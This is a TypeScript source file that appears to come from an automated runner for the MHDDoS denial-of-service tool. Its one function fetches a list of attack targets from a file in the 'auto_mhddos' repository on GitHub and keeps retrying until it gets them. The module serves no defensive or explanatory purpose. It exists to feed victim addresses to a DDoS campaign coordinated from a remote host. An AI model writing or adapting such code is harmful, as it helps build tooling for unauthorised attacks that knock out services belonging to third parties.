import { catchError, defer, from, Observable, switchMap, throwError } from 'rxjs';
import { fetch } from 'zx';
import { retry } from './retry';

export function fetchTargets(): Observable<string> {
  return defer(() => from(fetch('https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/runner_targets'))).pipe(
    switchMap((response) => (response.ok ? response.text() : fetchTargetsError())),
    catchError(() => fetchTargetsError()),
    retry(),
  );
}

function fetchTargetsError(): Observable<never> {
  return throwError(
    () => new Error("Failed to fetch targets. Something's wrong with the targets file or your connection. Retrying"),
  );
}
